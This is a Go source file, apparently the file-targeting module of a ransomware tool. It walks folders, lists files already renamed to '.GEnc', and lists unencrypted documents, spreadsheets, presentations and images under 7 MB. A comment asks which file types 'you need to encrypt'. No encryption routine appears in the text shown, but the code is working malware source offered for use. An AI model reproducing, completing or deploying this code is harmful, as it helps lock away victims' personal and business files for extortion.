/*
   This package allows you to scan encrypted
   and non-encrypted files in folders.
*/

package files_scanner

import (
    "os"
    "fmt"
    "strings"
    "path/filepath"
)


/*

	1  MB - 1048576  Bytes
	2  MB - 2097152  Bytes
	3  MB - 3145728  Bytes
	4  MB - 4194304  Bytes
	5  MB - 5242880  Bytes
	6  MB - 6291456  Bytes
	7  MB - 7340032  Bytes
	8  MB - 8388608  Bytes
	9  MB - 9437184  Bytes
	10 MB - 10485760 Bytes
	11 MB - 11534336 Bytes
	12 MB - 12582912 Bytes
	13 MB - 13631488 Bytes
	14 MB - 14680064 Bytes
	15 MB - 15728640 Bytes
	16 MB - 16777216 Bytes
	17 MB - 17825792 Bytes
	18 MB - 18874368 Bytes
	19 MB - 19922944 Bytes
	20 MB - 20971520 Bytes

*/

// Maximum file size (in bytes) 
var EncFilesSize = int64(7340032)
// What types of files do you need to encrypt?
var EncFilesExt = [] string { "lnk", "png", "jpg", "jpeg", "bmp", "txt", "doc", "docx", "pdf", "xls", "xlsx", "ppt", "pptx" }


// Check
func check(e error) {
    if e != nil {
        fmt.Println(e)
    }
}

// Scan for encrypted files
func ScanEncrypted(root string) []string {
    var files []string
    err := filepath.Walk(root, func(path string, info os.FileInfo, err error) error {
    	if strings.HasSuffix(path, ".GEnc") {
    		file, err := os.Stat(path)
    		check(err)
    		if !file.IsDir() {
    			fmt.Println("[+] Encrypted file found", path)
    			files = append(files, path)
    		}
    	}
        return nil
    })
    check(err)
    return files
}

// Scan for unencrypted files
func ScanUnEncrypted(root string) []string {
    var files []string
    err := filepath.Walk(root, func(path string, info os.FileInfo, err error) error {
    	if !strings.HasSuffix(path, ".GEnc") {
    		file, err := os.Stat(path)
    		check(err)
    		if !file.IsDir() {
    			if file.Size() <= EncFilesSize {
		    		for _, ext := range EncFilesExt {
		    			if strings.Contains(path, "." + ext) {
		    				fmt.Println("[+] UnEncrypted file found", path)
		    				files = append(files, path)
		    				break
		    			}
		    		}
    			}
    		}
    	}
        return nil
    })
    check(err)
    return files
}